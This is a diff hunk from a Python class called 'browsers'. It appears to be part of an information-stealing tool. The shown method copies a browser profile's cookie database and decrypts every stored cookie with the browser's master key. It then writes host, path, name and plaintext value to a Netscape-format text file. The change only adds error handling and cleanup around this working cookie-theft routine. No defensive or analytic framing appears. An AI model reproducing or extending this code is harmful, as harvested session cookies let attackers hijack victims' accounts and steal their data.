@@ -271,32 +271,40 @@ class browsers:
         path += "\\" + profile + "\\Network\\Cookies"
         if not os.path.isfile(path):
             return
-        copy2(path, "Cookievault.db")
-        conn = connect("Cookievault.db")
-        cursor = conn.cursor()
-        with open(".\\browser-cookies.txt", "a+", encoding="utf-8") as f:
-            for res in cursor.execute(
-                "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
-            ).fetchall():
-                host_key, name, path, encrypted_value, expires_utc = res
-                value = self.decrypt_password(encrypted_value, self.masterkey)
-                if host_key and name and value != "":
-                    f.write(
-                        "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
-                            host_key,
-                            "FALSE" if expires_utc == 0 else "TRUE",
-                            path,
-                            "FALSE" if host_key.startswith(".") else "TRUE",
-                            expires_utc,
-                            name,
-                            value,
+        try:
+            copy2(path, "Cookievault.db")
+            conn = connect("Cookievault.db")
+            cursor = conn.cursor()
+            with open(
+                ".\\browser-cookies.txt", "a+", encoding="utf-8", errors="ignore"
+            ) as f:
+                for res in cursor.execute(
+                    "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
+                ).fetchall():
+                    host_key, name, path, encrypted_value, expires_utc = res
+                    value = self.decrypt_password(encrypted_value, self.masterkey)
+                    if host_key and name and value != "":
+                        f.write(
+                            "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                                host_key,
+                                "FALSE" if expires_utc == 0 else "TRUE",
+                                path,
+                                "FALSE" if host_key.startswith(".") else "TRUE",
+                                expires_utc,
+                                name,
+                                value,
+                            )
                         )
-                    )
-                else:
-                    f.write("No cookies were found :(")
-        cursor.close()
-        conn.close()
-        os.remove("Cookievault.db")
+                    else:
+                        f.write("No cookies were found :(")
+            cursor.close()
+            conn.close()
+            os.remove("Cookievault.db")
+        except Exception as e:
+            try:
+                os.remove("Cookievault.db")
+            except:
+                pass
 
     def history(self, name: str, path: str, profile: str) -> None:
         path += "\\" + profile + "\\History"
